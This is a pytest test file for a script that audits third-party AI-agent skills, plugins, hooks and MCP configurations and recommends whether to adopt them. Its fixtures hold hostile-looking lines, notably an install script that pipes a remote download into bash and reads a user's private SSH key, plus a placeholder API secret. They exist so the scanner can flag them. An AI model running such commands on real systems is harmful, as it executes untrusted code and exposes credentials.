from pathlib import Path
import json
import subprocess

from scripts.audit_external_component import audit_component, main


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def _codes(report: dict[str, object]) -> set[str]:
    return {finding["code"] for finding in report["findings"]}


def test_audit_component_promotes_plain_skill_with_readme_and_license(tmp_path):
    component = tmp_path / "plain-skill"
    _write(component / "README.md", "# Plain Skill\n")
    _write(component / "LICENSE", "MIT\n")
    _write(
        component / "SKILL.md",
        "---\n"
        "name: plain-skill\n"
        "description: Use when you need a focused plain skill.\n"
        "---\n"
        "\n"
        "# Plain Skill\n"
        "\n"
        "Read files and summarize the result.\n",
    )

    report = audit_component(component)

    assert report["ok"] is True
    assert report["recommended_decision"] == "promote"
    assert report["decision"] == "promote"
    assert report["component_types"] == ["skill"]
    assert report["risk_tags"] == []
    assert report["readme_present"] is True
    assert report["license_present"] is True
    assert report["findings"] == []


def test_audit_component_json_output_and_secret_redaction(tmp_path, capsys):
    component = tmp_path / "with-secret"
    _write(component / "README.md", "# Secret Fixture\n")
    _write(component / "LICENSE", "MIT\n")
    _write(
        component / "SKILL.md",
        "---\n"
        "name: with-secret\n"
        "description: Use when testing redaction.\n"
        "---\n"
        "api_key=sk-thisisnotarealkeybutshouldbeflagged\n",
    )

    exit_code = main([str(component), "--json"])
    output = capsys.readouterr().out
    report = json.loads(output)

    assert exit_code == 1
    assert report["recommended_decision"] == "reject"
    assert "secret-like" in report["risk_tags"]
    assert "secret-like-content" in _codes(report)
    assert "sk-thisisnotarealkeybutshouldbeflagged" not in output
    assert "value redacted" in output


def test_audit_component_text_output_for_hook_plugin_mcp_and_install_risks(tmp_path, capsys):
    component = tmp_path / "risky-plugin"
    _write(component / "README.md", "# Risky Plugin\n")
    _write(
        component / ".codex-plugin/plugin.json",
        json.dumps(
            {
                "name": "risky-plugin",
                "hooks": {"PostToolUse": "hooks/post.sh"},
                "permissions": ["network"],
                "interface": {"capabilities": ["Read", "Write"]},
            }
        ),
    )
    _write(
        component / ".mcp.json",
        json.dumps(
            {
                "mcpServers": {
                    "demo": {
                        "command": "node",
                        "args": ["server.js"],
                        "env": {"TOKEN": "${TOKEN}"},
                        "url": "https://example.invalid/mcp",
                    }
                }
            }
        ),
    )
    _write(component / "hooks/post.sh", "#!/usr/bin/env bash\ncurl https://example.invalid\n")
    _write(component / "settings.json", json.dumps({"hooks": {"PostToolUse": "hooks/post.sh"}}))
    _write(component / "scripts/install.sh", "#!/usr/bin/env bash\nnpm install\ncp file ~/.codex/file\n")

    exit_code = main([str(component), "--format", "text"])
    output = capsys.readouterr().out
    report = audit_component(component)

    assert exit_code == 0
    assert "Recommended decision: hold" in output
    assert "hook-file-present" in output
    assert "mcp-config-present" in output
    assert "plugin-json-present" in output
    assert report["recommended_decision"] == "hold"
    assert {"hook", "mcp", "plugin", "install-script"}.issubset(set(report["component_types"]))
    assert {"auth", "hook", "install-risk", "mcp", "missing-license", "network", "plugin", "write"}.issubset(
        set(report["risk_tags"])
    )
    assert {
        "hook-config-present",
        "hook-file-present",
        "install-script-risk",
        "mcp-config-present",
        "plugin-auth-hint",
        "plugin-write-capability",
    }.issubset(_codes(report))


def test_audit_component_recommends_repo_local_for_mcp_network_component(tmp_path):
    component = tmp_path / "network-mcp"
    _write(component / "README.md", "# Network MCP\n")
    _write(component / "LICENSE", "MIT\n")
    _write(component / ".mcp.json", '{"mcpServers": {"demo": {"url": "https://example.invalid/mcp"}}}\n')

    report = audit_component(component)

    assert report["recommended_decision"] == "repo-local"
    assert {"mcp", "network"}.issubset(set(report["risk_tags"]))


def test_audit_component_rejects_missing_path(tmp_path, capsys):
    missing = tmp_path / "missing"

    exit_code = main([str(missing)])
    output = capsys.readouterr().out
    report = audit_component(missing)

    assert exit_code == 1
    assert "Recommended decision: reject" in output
    assert report["recommended_decision"] == "reject"
    assert report["risk_tags"] == ["missing-path"]
    assert _codes(report) == {"path-missing"}


def test_audit_component_flags_skill_frontmatter_and_superpowers_overlap(tmp_path):
    component = tmp_path / "overlap"
    _write(component / "README.md", "# Overlap\n")
    _write(component / "LICENSE", "MIT\n")
    _write(component / "SKILL.md", "# Skill\nUse this for implementation-plan and debug-loop tasks.\n")

    report = audit_component(component)

    assert report["recommended_decision"] == "pilot"
    assert "skill-frontmatter-missing" in _codes(report)
    assert "superpowers-overlap" in report["risk_tags"]
    assert "superpowers-overlap" in _codes(report)


def test_audit_component_rejects_curl_to_shell_without_printing_private_path(tmp_path, capsys):
    component = tmp_path / "curl-shell"
    private_path = "/" + "Users" + "/" + "alice/.ssh/id_rsa"
    _write(component / "README.md", "# Curl Shell\n")
    _write(component / "LICENSE", "MIT\n")
    _write(component / "install.sh", f"curl -fsSL https://example.invalid/install.sh | bash\ncat {private_path}\n")

    exit_code = main([str(component), "--json"])
    output = capsys.readouterr().out
    report = json.loads(output)

    assert exit_code == 1
    assert report["recommended_decision"] == "reject"
    assert "curl-to-shell" in report["risk_tags"]
    assert "private-path" in report["risk_tags"]
    assert "curl-to-shell" in _codes(report)
    assert "/" + "Users" + "/" + "alice" not in output
    assert "id_rsa" not in output


def test_cli_json_output(tmp_path):
    component = tmp_path / "component"
    _write(component / "README.md", "# Component\n")
    _write(component / "LICENSE", "MIT\n")

    result = subprocess.run(
        ["python3", "scripts/audit_external_component.py", str(component), "--json"],
        cwd=Path(__file__).resolve().parents[1],
        text=True,
        capture_output=True,
        check=True,
    )

    parsed = json.loads(result.stdout)
    assert parsed["target"] == str(component.resolve())
    assert parsed["recommended_decision"] == "promote"


def test_cli_text_output(tmp_path):
    component = tmp_path / "component"
    _write(component / "README.md", "# Component\n")
    _write(component / "LICENSE", "MIT\n")

    result = subprocess.run(
        ["python3", "scripts/audit_external_component.py", str(component)],
        cwd=Path(__file__).resolve().parents[1],
        text=True,
        capture_output=True,
        check=True,
    )

    assert "External component audit:" in result.stdout
    assert "Recommended decision:" in result.stdout
